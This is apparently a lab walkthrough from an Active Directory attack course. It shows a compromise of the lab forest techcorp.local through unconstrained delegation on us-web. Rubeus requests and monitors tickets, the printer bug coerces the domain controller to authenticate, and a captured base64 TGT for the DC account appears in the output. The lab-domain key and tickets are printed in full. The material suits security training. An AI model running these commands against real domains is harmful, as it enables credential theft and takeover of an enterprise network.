# Hands-On 18:

```
Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on techcorp.local.
```

## Index Of Content

  1.[Unconstrained Delegation](#unconstrained-delegation)
  
## Unconstrained Delegation

Access to US-WEB with webmaster credentials privileges:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US.TECHCORP.LOCALwebmaster
[*] Using aes256_cts_hmac_sha1 hash: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\webmaster'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  webmaster
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/26/2023 11:04:10 AM
  EndTime                  :  2/26/2023 9:04:10 PM
  RenewTill                :  3/5/2023 11:04:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  pKCLWyDX6NQwsR+7cPJDMU506DrpVV+SaXezinEN4Eg=
  ASREP (key)              :  2A653F166761226EB2E939218F5A34D3D2AF005A91F160540DA6E4A5E29DE8A0


C:\Windows\system32>winrs -r:us-web cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>hostname
hostname
US-Web

C:\Users\webmaster>
```

Copy Rubeus fron attacker mahine to us-web:
```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\\Public\Rubeus.exe
Does \\us-web\C$\Users\\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

```


Enable monitoring process:

```
C:\Users\Public>C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : TECHCORP-DC$
[*] Monitoring every 5 seconds for new TGTs

```

Send request notificationo and obtain the requested TGT using unconstrained delegation:
```
C:\Users\studentuser17>C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!

C:\Users\studentuser17>

```

```
[*] 2/26/2023 7:14:33 PM UTC - Found new TGT:

  User                  :  TECHCORP-DC$@TECHCORP.LOCAL
  StartTime             :  2/26/2023 5:35:31 AM
  EndTime               :  2/26/2023 3:35:31 PM
  RenewTill             :  3/4/2023 8:04:15 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```
